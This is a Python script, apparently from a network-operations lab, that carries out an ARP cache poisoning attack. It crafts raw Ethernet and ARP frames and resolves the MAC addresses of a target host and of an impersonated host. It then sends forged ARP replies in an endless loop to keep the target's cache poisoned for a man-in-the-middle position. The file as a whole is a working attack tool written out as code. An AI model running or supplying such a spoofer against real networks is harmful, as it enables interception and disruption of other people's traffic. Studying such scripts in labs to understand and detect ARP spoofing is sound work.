#!/usr/bin/python3.7
import socket
import struct
import cno_net_helper as cno
from time import sleep

dev = "ens33"


def make_eth_hdr(dst_mac, src_mac, typ):
    dst = cno.mac_str_to_bin(dst_mac)
    src = cno.mac_str_to_bin(src_mac)
    return dst + src + struct.pack('>H', typ)


def make_arp_req(dst_ip, src_mac, src_ip):
    arpreq = b"\x00\x01"  # HW type
    arpreq += b"\x08\x00"  # Protocol type
    arpreq += b"\x06"  # HW addr len
    arpreq += b"\x04"  # Proto addr len
    arpreq += b"\x00\x01"  # Op Code
    arpreq += cno.mac_str_to_bin(src_mac)
    arpreq += socket.inet_pton(socket.AF_INET, src_ip)
    arpreq += b"\x00" * 6  # all zeroes
    arpreq += socket.inet_pton(socket.AF_INET, dst_ip)
    return arpreq


def send_arp_req(dst_ip, dst_mac, src_ip, src_mac):
    dst = cno.mac_str_to_bin(dst_mac)
    src = cno.mac_str_to_bin(src_mac)
    typ = b"\x08\x06"  # ARP type
    arpreq = make_arp_req(dst_ip, src_mac, src_ip)
    etherhdr = dst + src + typ
    cno.rawsend(etherhdr + arpreq, dev)


def make_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip):
    arpreq = b"\x00\x01"  # HW type
    arpreq += b"\x08\x00"  # Protocol type (IP)
    arpreq += b"\x06"  # HW addr len
    arpreq += b"\x04"  # Proto addr len
    arpreq += b"\x00\x02"  # Op Code
    arpreq += cno.mac_str_to_bin(src_mac)
    arpreq += socket.inet_pton(socket.AF_INET, spoof_ip)
    arpreq += cno.mac_str_to_bin(dst_mac)
    arpreq += socket.inet_pton(socket.AF_INET, dst_ip)
    return arpreq


def send_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip, spoof_mac):
    etherhdr = make_eth_hdr(dst_mac, spoof_mac, cno.ETH_TYPES['ARP'])
    arpreq = make_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip)

    cno.rawsend(etherhdr + arpreq, dev)


broadcast_MAC = "FF:FF:FF:FF:FF:FF"  # Brodcast mac address
src_mac = "00:0c:29:f2:89:71"  # My machines mac address

src_ip = "172.16.0.128"  # My machines ip address
dst_ip = "172.16.0.4"   # The target machines ip address

# 1. Get MAC for dst_ip, view ARP response in WireShark
send_arp_req(dst_ip, broadcast_MAC, src_ip, src_mac)
dst_mac = "54:bf:64:8f:d9:a8"  # The target machines mac address

# 2. Get mac address for the thing I am spoofing, view ARP response in wireshark
# Want to ensure it looks like it came from the actual box I am spoofing
spoof_ip = "172.16.0.162"
send_arp_req(spoof_ip, broadcast_MAC, src_ip, src_mac)
spoof_mac = "80:18:44:ef:ca:58"

# 3. Because the arp cache refreshes, continue to send the arp response
# to keep the connection poisoned
while True:
    sleep(0.5)
    send_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip, spoof_mac)
